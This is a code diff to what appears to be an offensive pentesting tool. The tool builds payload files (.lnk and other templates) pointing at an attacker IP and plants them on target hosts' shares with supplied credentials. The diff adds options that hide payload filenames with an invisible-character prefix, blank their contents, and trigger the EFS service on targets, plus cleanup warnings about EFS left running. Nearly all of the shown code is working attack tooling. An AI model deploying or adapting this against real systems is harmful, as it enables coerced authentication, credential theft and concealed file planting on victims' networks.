@@ -17,6 +17,7 @@ Functions:
 """
 
 import json
+import logging
 from datetime import datetime
 from pathlib import Path
 import sys
@@ -63,16 +64,32 @@ def handle_generate(args):
 
     payload_extension = Path(args.payload).suffix
     template_path = Path(__file__).parent / f"template{payload_extension}"
+    invisible = getattr(args, "invisible", False)
 
     if payload_extension == ".lnk":
         lnk_template = get_lnk_template(template_path)
         payload_contents = create_lnk_payload(args.attacker, lnk_template)
+        if invisible:
+            # Filename gets the SOH prefix; icon-blanking for .lnk is not
+            # supported (would require binary template surgery).
+            logging.getLogger("main_logger").warning(
+                "--invisible only blanks the filename for .lnk payloads; "
+                "icon blanking is unsupported for binary lnk templates.",
+                extra={"path": args.payload},
+            )
     else:
         with open(template_path, "r", encoding="utf-8") as template_file:
             payload_contents = template_file.read()
             payload_contents = payload_contents.format(attacker_ip=args.attacker)
+        if invisible:
+            payload_contents = make_invisible_payload_contents(
+                payload_contents, payload_extension
+            )
 
-    write_payload_local(args.payload, payload_contents)
+    payload_name = (
+        make_invisible_payload_name(args.payload) if invisible else args.payload
+    )
+    write_payload_local(payload_name, payload_contents)
 
 
 def handle_rank(args, credentials, log_queue):
@@ -163,25 +180,35 @@ def handle_deploy(args, credentials):
 
     payload_extension = Path(args.payload).suffix
     template_path = Path(__file__).parent / f"template{payload_extension}"
+    invisible = getattr(args, "invisible", False)
 
     if payload_extension == ".lnk":
         lnk_template = get_lnk_template(template_path)
         payload_contents = create_lnk_payload(args.attacker, lnk_template)
+        if invisible:
+            logging.getLogger("main_logger").warning(
+                "--invisible only blanks the filename for .lnk payloads; "
+                "icon blanking is unsupported for binary lnk templates.",
+                extra={"path": args.payload},
+            )
     else:
         with open(template_path, "r", encoding="utf-8") as template_file:
             template_contents = template_file.read()
             payload_contents = template_contents.format(attacker_ip=args.attacker)
+        if invisible:
+            payload_contents = make_invisible_payload_contents(
+                payload_contents, payload_extension
+            )
 
-    payload_name = args.payload
-    if getattr(args, "invisible", False):
-        payload_name = make_invisible_payload_name(payload_name)
-        payload_contents = make_invisible_payload_contents(
-            payload_contents, payload_extension
-        )
-
+    payload_name = (
+        make_invisible_payload_name(args.payload) if invisible else args.payload
+    )
     force = getattr(args, "force", False)
+    encrypt = getattr(args, "encrypt", False)
+    encrypt_keep = getattr(args, "encrypt_keep", False)
+    encrypt_target = getattr(args, "encrypt_target", "payload")
     probe_delete = getattr(args, "probe_delete", False)
-
+    encrypt_hosts = set()  # Hosts where we likely woke EFS
     for target in targets:
         target.connect(credentials)
         for path in target.paths:
@@ -190,12 +217,25 @@ def handle_deploy(args, credentials):
                 payload_name=payload_name,
                 payload=payload_contents,
                 force=force,
+                encrypt=encrypt,
+                encrypt_keep=encrypt_keep,
+                encrypt_target=encrypt_target,
                 probe_delete=probe_delete,
             )
             if new_payload_path is not None:
                 payloads_written.append(new_payload_path)
+                if encrypt:
+                    encrypt_hosts.add(target.host)
 
     write_list_to_file(payloads_written, "payloads_written.txt", "w")
+    # Sidecar tracking: which hosts likely have an EFS service started by
+    # the --encrypt trigger. Cleanup uses this to WARN that the EFS service
+    # is probably still Running on those hosts even after the payload is
+    # deleted — a real artifact left by the engagement.
+    if encrypt_hosts:
+        write_list_to_file(
+            sorted(encrypt_hosts), "encrypt_triggered_hosts.txt", "w"
+        )
 
 
 def handle_cleanup(args, credentials):
@@ -214,7 +254,6 @@ def handle_cleanup(args, credentials):
         None
     """
     payloads_not_deleted = []
-    payloads_not_deleted = []
     targets = read_targets(args.targets)
     for target in targets:
         target.connect(credentials)
@@ -223,6 +262,28 @@ def handle_cleanup(args, credentials):
         payloads_not_deleted.extend(target.delete_payloads())
 
     write_list_to_file(payloads_not_deleted, "payloads_not_deleted.txt", "w")
+
+    # If the prior deploy tracked --encrypt-triggered hosts, warn that the
+    # EFS service is likely still Running on them — deleting the payload
+    # does not stop the service. The pentester can verify with:
+    #   Get-Service EFS  (PowerShell on the target)
+    try:
+        with open("encrypt_triggered_hosts.txt", encoding="utf-8") as f:
+            triggered = [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        triggered = []
+    if triggered:
+        msg = (
+            "EFS service is likely still RUNNING on "
+            f"{len(triggered)} host(s) that received an --encrypt payload "
+            "during deploy: "
+            + ", ".join(triggered)
+            + ". Cleanup removed the file(s) but did not stop the service. "
+            "Verify with `Get-Service EFS` on each host; if stopping is "
+            "required for engagement cleanliness, do so out-of-band."
+        )
+        logging.getLogger("main_logger").warning(msg, extra={"path": None})
+        print(msg, file=sys.stderr)
 
     if len(payloads_not_deleted) == 0:
         print("All payloads deleted successfully.")
